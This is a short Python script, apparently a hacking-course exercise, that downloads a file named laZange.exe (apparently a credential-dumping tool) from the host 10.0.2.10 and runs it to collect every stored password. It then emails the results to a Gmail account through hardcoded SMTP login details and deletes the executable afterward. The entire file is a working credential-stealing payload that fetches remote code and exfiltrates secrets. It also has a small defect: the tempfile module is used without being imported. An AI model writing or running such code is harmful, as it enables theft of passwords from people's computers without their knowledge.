import requests, subprocess, smtplib, os 

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open (file_name, "wb") as out_file:
		out_file.write(get_response.content)


def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.10/files/laZange.exe")
result = subprocess.check_output("laZange.exe all", shell=True)
send_mail("uf@@@@@@@gmail.com", "password", result)
os.remove("laZange.exe")
